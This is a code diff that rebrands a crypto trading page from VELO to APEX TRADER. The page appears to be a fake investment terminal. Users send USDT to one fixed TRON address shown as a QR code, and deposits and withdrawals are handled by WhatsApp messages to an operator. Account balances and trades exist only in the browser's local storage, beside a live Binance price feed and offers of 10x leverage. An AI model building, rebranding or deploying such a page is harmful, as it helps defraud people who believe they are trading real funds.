@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-    <title>VELO | Private Terminal — TRON Deposit</title>
+    <title>APEX TRADER | Professional Trading Terminal</title>
     <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Mono:wght@400;500&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet" />
     <!-- QR code library (simple, lightweight, no external images) -->
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs2-fix@0.0.1/qrcode.min.js"></script>
@@ -52,8 +52,8 @@
         }
         .logo {
             font-family: 'Bebas Neue', sans-serif;
-            font-size: 24px;
-            letter-spacing: 3px;
+            font-size: 26px;
+            letter-spacing: 2px;
             color: var(--gold);
             line-height: 1;
         }
@@ -149,7 +149,6 @@
         .stat-val { font-family: 'DM Mono', monospace; font-weight: 500; }
         .wizard-step { animation: fadeIn .25s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
-        /* QR CONTAINER - actual dynamic tron qr code */
         .qr-wrapper {
             background: #ffffff;
             padding: 12px;
@@ -161,12 +160,6 @@
             justify-content: center;
             align-items: center;
         }
-        #dynamic-qr {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        /* ensure canvas QR scales nicely */
         #dynamic-qr img, #dynamic-qr canvas {
             max-width: 100%;
             height: auto;
@@ -197,7 +190,7 @@
             .sidebar { width: 100%; overflow-y: visible; padding: 12px; gap: 10px; }
             .ticker-extras { display: none; }
             .vault-amt { font-size: 14px; }
-            .logo { font-size: 20px; }
+            .logo { font-size: 22px; }
         }
         @media (max-width: 400px) { .ticker-change { display: none; } }
         @media (min-width: 769px) {
@@ -213,14 +206,20 @@
             display: inline-block;
             font-weight: 600;
         }
+        .footer-note {
+            font-size: 8px;
+            text-align: center;
+            color: var(--text-dim);
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
 
 <nav>
     <div>
-        <div class="logo">VELO</div>
-        <span class="logo-sub">CRYPTO TRADING PLATFORM</span>
+        <div class="logo">APEX TRADER</div>
+        <span class="logo-sub">PROFESSIONAL TRADING TERMINAL</span>
     </div>
     <div class="vault-display">
         <div class="vault-label">Live Vault Balance</div>
@@ -264,7 +263,7 @@
                 <button class="tab" id="tab-with-btn" onclick="switchTab('withdraw')">Withdraw</button>
             </div>
 
-            <!-- DEPOSIT WIZARD with working TRON QR code -->
+            <!-- DEPOSIT WIZARD with TRON QR code -->
             <div id="view-deposit">
                 <div id="step-1" class="wizard-step">
                     <p style="font-size:13px;font-weight:700;color:var(--gold);margin-bottom:6px;">STEP 1 — Send USDT (TRC20)</p>
@@ -277,7 +276,6 @@
                         ✔ Send <b>USDT only</b> — minimum deposit: <b>$10 USDT</b><br>
                         ✔ Funds credited after 1 on-chain confirmation
                     </div>
-                    <!-- DYNAMIC QR CODE generated from actual TRON address -->
                     <div class="qr-wrapper" id="qr-container">
                         <div id="dynamic-qr"></div>
                     </div>
@@ -326,18 +324,19 @@
             <div class="stat-row"><span>Open Positions</span><span id="active-count" class="stat-val">0</span></div>
             <div class="stat-row"><span>Unrealized P&amp;L</span><span id="pnl-val" class="stat-val">$0.00</span></div>
             <p style="font-size:10px;color:var(--text-dim);text-align:center;margin-top:16px;text-decoration:underline;cursor:pointer;" onclick="toggleTerms(true)">Legal Disclosures &amp; Terms</p>
+            <div class="footer-note">APEX TRADER | apextrade.co.ke</div>
         </div>
     </div>
 </div>
 
 <div id="terms-modal">
     <div class="terms-content">
-        <h2 style="font-family:'Bebas Neue';color:var(--gold);margin-bottom:18px;font-size:22px;">Institutional Terms</h2>
+        <h2 style="font-family:'Bebas Neue';color:var(--gold);margin-bottom:18px;font-size:22px;">APEX TRADER | Terms of Service</h2>
         <div style="font-size:12px;color:var(--text-dim);line-height:1.8;">
-            <p><b>1. Network Policy:</b> VELO operates exclusively on the <b>TRON (TRC20)</b> network. Deposits sent via ERC20, BEP20, or other chains are non-recoverable.</p><br>
+            <p><b>1. Network Policy:</b> APEX TRADER operates exclusively on the <b>TRON (TRC20)</b> network. Deposits sent via ERC20, BEP20, or other chains are non-recoverable.</p><br>
             <p><b>2. Manual Auditing:</b> All deposits and payouts are audited manually. Credits typically reflect within 15–60 minutes.</p><br>
             <p><b>3. Market Risk:</b> Trading involves high leverage (10×). Manage your margin to avoid liquidation.</p><br>
-            <p><b>4. Governing Law:</b> All disputes arising from the use of VELO shall be governed exclusively by the laws of the <b>Republic of Kenya</b>.</p>
+            <p><b>4. Governing Law:</b> All disputes arising from the use of APEX TRADER shall be governed exclusively by the laws of the <b>Republic of Kenya</b>.</p>
         </div>
         <button class="btn btn-gold" style="margin-top:22px;" onclick="toggleTerms(false)">I ACCEPT TERMS</button>
     </div>
@@ -350,29 +349,25 @@
     const TRON_DEPOSIT_ADDRESS = "TWCphpX7xGQ9r5jCiLwcfHeF9skJ8bAZe1";
     
     // State variables
-    let balance = parseFloat(localStorage.getItem('velo_balance') || '0');
-    let trades = JSON.parse(localStorage.getItem('velo_trades') || '[]');
+    let balance = parseFloat(localStorage.getItem('apex_balance') || '0');
+    let trades = JSON.parse(localStorage.getItem('apex_trades') || '[]');
     let btcPrice = 0;
     let prevPrice = 0;
     let wsReconnectTimer = null;
     let toastTimer = null;
-    const phone = '254700000000';  // update to real whatsapp number if needed
+    const phone = '254700000000';  // update to actual WhatsApp number
 
-    // Helper functions
     function saveState() {
-        localStorage.setItem('velo_balance', balance.toFixed(2));
-        localStorage.setItem('velo_trades', JSON.stringify(trades));
+        localStorage.setItem('apex_balance', balance.toFixed(2));
+        localStorage.setItem('apex_trades', JSON.stringify(trades));
     }
 
-    // ---------- QR CODE generation (fix: real TRON address QR) ----------
+    // QR CODE generation with actual TRON address
     function generateTronQR() {
         const qrContainer = document.getElementById("dynamic-qr");
         if (!qrContainer) return;
-        // clear any previous content
         qrContainer.innerHTML = "";
         try {
-            // Using QRCode.js library (qrcodejs2-fix) - create new QRCode instance
-            // The library expects a div element and options
             // @ts-ignore
             new QRCode(qrContainer, {
                 text: TRON_DEPOSIT_ADDRESS,
@@ -383,16 +378,14 @@
                 correctLevel: QRCode.CorrectLevel.M
             });
         } catch(e) {
-            console.warn("QR init fallback", e);
-            qrContainer.innerHTML = `<div style="background:#fff; padding:8px; border-radius:12px; text-align:center; color:#000; font-size:9px;">⚠️ QR failed<br>Address: ${TRON_DEPOSIT_ADDRESS.slice(0,8)}...</div>`;
+            console.warn("QR fallback", e);
+            qrContainer.innerHTML = `<div style="background:#fff; padding:8px; border-radius:12px; text-align:center; color:#000; font-size:9px;">⚠️ QR Code<br>${TRON_DEPOSIT_ADDRESS.slice(0,10)}...</div>`;
         }
     }
     
-    // also refresh on window load and whenever deposit tab becomes visible (for safety)
     function refreshDepositQR() {
         const step1 = document.getElementById('step-1');
         if (step1 && step1.style.display !== 'none') {
-            // re-generate QR to ensure visibility (sometimes library needs re-attach)
             const qrDiv = document.getElementById("dynamic-qr");
             if (qrDiv) {
                 qrDiv.innerHTML = "";
@@ -410,7 +403,6 @@
         }
     }
     
-    // copy address handler
     function copyAddr() {
         navigator.clipboard.writeText(TRON_DEPOSIT_ADDRESS)
             .then(() => showToast('✅ TRON ADDRESS COPIED'))
@@ -425,13 +417,11 @@
         toastTimer = setTimeout(() => t.style.display = 'none', 3000);
     }
     
-    // deposit wizard steps
     function nextStep(n) {
         document.querySelectorAll('#view-deposit .wizard-step').forEach(s => s.style.display = 'none');
         const target = document.getElementById('step-' + n);
         if (target) target.style.display = 'block';
         if (n === 1) {
-            // ensure QR is visible when returning to step 1 (prevents empty qr)
             setTimeout(() => refreshDepositQR(), 30);
         }
     }
@@ -447,7 +437,6 @@
             depBtn.classList.add('active');
             withBtn.classList.remove('active');
             nextStep(1);
-            // Regenerate QR code every time deposit tab is shown (critical fix)
             setTimeout(() => {
                 const qrContainer = document.getElementById("dynamic-qr");
                 if (qrContainer) {
@@ -470,7 +459,6 @@
         }
     }
     
-    // Trading logic
     function executeTrade(side) {
         if (!btcPrice || btcPrice <= 0) return showToast('⛔ WAITING FOR LIVE PRICE');
         const margin = parseFloat(document.getElementById('trade-amount').value);
@@ -515,7 +503,7 @@
         if (type === 'DEPOSIT') {
             const amt = document.getElementById('kes-dep').value;
             if (!amt || parseFloat(amt) <= 0) return showToast('ENTER VALID KES AMOUNT');
-            const msg = `*VELO DEPOSIT NOTIFICATION*\n\nAsset: USDT (TRC20)\nAmount: KES ${amt}\nTRON Address: ${TRON_DEPOSIT_ADDRESS}\nStatus: Sent\n\nPlease audit and credit my terminal balance.`;
+            const msg = `*APEX TRADER DEPOSIT NOTIFICATION*\n\nAsset: USDT (TRC20)\nAmount: KES ${amt}\nTRON Address: ${TRON_DEPOSIT_ADDRESS}\nStatus: Sent\n\nPlease audit and credit my terminal balance.`;
             window.open(`https://wa.me/${phone}?text=${encodeURIComponent(msg)}`);
             nextStep(1);
             document.getElementById('kes-dep').value = '';
@@ -524,12 +512,12 @@
             const addr = document.getElementById('addr-with').value.trim();
             if (!amt || parseFloat(amt) < 1000) return showToast('MINIMUM WITHDRAWAL IS KES 1,000');
             if (!addr.startsWith('T') || addr.length !== 34) return showToast('INVALID TRC20 ADDRESS (must start with T, 34 chars)');
-            const msg = `*VELO WITHDRAWAL REQUEST*\n\nAmount: KES ${amt}\nDestination: ${addr}\nNetwork: TRC20`;
+            const msg = `*APEX TRADER WITHDRAWAL REQUEST*\n\nAmount: KES ${amt}\nDestination: ${addr}\nNetwork: TRC20`;
             window.open(`https://wa.me/${phone}?text=${encodeURIComponent(msg)}`);
         }
     }
     
-    // WebSocket price
+    // WebSocket price feed
     function connectWS() {
         const ws = new WebSocket('wss://stream.binance.com:9443/ws/btcusdt@ticker');
         ws.onmessage = (e) => {
@@ -559,12 +547,11 @@
         ws.onerror = () => { ws.close(); };
     }
     
-    // initial load + DOM ready
+    // DOM ready initialization
     window.addEventListener('DOMContentLoaded', () => {
         updateUI();
         if (trades.length) updatePnL();
         connectWS();
-        // Generate QR code for TRON address (primary fix)
         const qrDiv = document.getElementById("dynamic-qr");
         if (qrDiv) {
             qrDiv.innerHTML = "";
@@ -577,13 +564,12 @@
                 colorLight: "#ffffff"
             });
         }
-        // set address text inside address box
         const addrSpan = document.getElementById('tron-address-display');
         if(addrSpan) addrSpan.innerText = TRON_DEPOSIT_ADDRESS;
-        // ensure deposit is step1 visible
         nextStep(1);
     });
     
+    // Expose global functions
     window.executeTrade = executeTrade;
     window.switchTab = switchTab;
     window.nextStep = nextStep;
@@ -591,10 +577,9 @@
     window.sendAction = sendAction;
     window.toggleTerms = toggleTerms;
     
-    // extra safety: on resize or orientation, QR remains stable but we can recall if needed
+    // Refresh QR on resize for safety
     window.addEventListener('resize', () => {
         if(document.getElementById('view-deposit').style.display !== 'none') {
-            // soft refresh to prevent canvas distortion (optional)
             const qrNode = document.getElementById("dynamic-qr");
             if(qrNode && qrNode.children.length === 0) {
                 // @ts-ignore
